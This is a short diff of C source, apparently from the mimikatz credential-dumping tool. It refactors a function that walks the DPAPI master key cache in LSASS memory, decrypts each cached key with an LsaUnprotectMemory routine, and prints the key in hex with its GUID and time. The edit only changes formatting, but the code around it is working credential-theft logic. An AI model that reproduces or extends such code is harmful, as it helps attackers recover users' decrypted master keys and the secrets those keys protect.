@@ -131,7 +131,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_masterkeys(IN ULONG_PTR pMaste
 	ULONG_PTR ptr;
 	ULONG monNb = 0;
 	PBYTE buffer;
-	SYSTEMTIME sTime;
+
 	if(ReadMemory(pMasterKeyCacheList, &mesCredentials, sizeof(LIST_ENTRY), NULL))
 	{
 		ptr = (ULONG_PTR) mesCredentials.Flink;
@@ -141,18 +141,16 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_masterkeys(IN ULONG_PTR pMaste
 			{
 				if(RtlEqualLuid(logId, &mesCredentials.LogonId))
 				{
-					dprintf("\n\t [%08x] ", monNb++);
-					dprintf("\n\t * GUID :\t{%08x-%04hx-%04hx-%02x%02x-%02x%02x%02x%02x%02x%02x}", mesCredentials.KeyUid.Data1, mesCredentials.KeyUid.Data2, mesCredentials.KeyUid.Data3, mesCredentials.KeyUid.Data4[0], mesCredentials.KeyUid.Data4[1], mesCredentials.KeyUid.Data4[2], mesCredentials.KeyUid.Data4[3], mesCredentials.KeyUid.Data4[4], mesCredentials.KeyUid.Data4[5], mesCredentials.KeyUid.Data4[6], mesCredentials.KeyUid.Data4[7]);
-					if(FileTimeToSystemTime(&mesCredentials.insertTime, &sTime))
-					{
-						dprintf("\n\t * Time :\t%02hu/%02hu/%04hu %02hu:%02hu:%02hu,%hu", sTime.wDay, sTime.wMonth, sTime.wYear, sTime.wHour, sTime.wMinute, sTime.wSecond, sTime.wMilliseconds);
-					}
+					dprintf("\n\t [%08x]\n\t * GUID :\t", monNb++);
+					kull_m_string_displayGUID(&mesCredentials.KeyUid);
+					dprintf("\n\t * Time :\t"); kull_m_string_displayFileTime(&mesCredentials.insertTime);
+
 					if(buffer = (PBYTE) LocalAlloc(LPTR, mesCredentials.keySize))
 					{						
 						if(ReadMemory(ptr + FIELD_OFFSET(KIWI_MASTERKEY_CACHE_ENTRY, key), buffer, mesCredentials.keySize, NULL))
 						{
 							kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(buffer, mesCredentials.keySize);
-							dprintf("\n\t * Key :\t"); kull_m_string_dprintf_hex(buffer, mesCredentials.keySize, 1);
+							dprintf("\n\t * Key :\t"); kull_m_string_dprintf_hex(buffer, mesCredentials.keySize, 0);
 						}
 						LocalFree(buffer);
 					}
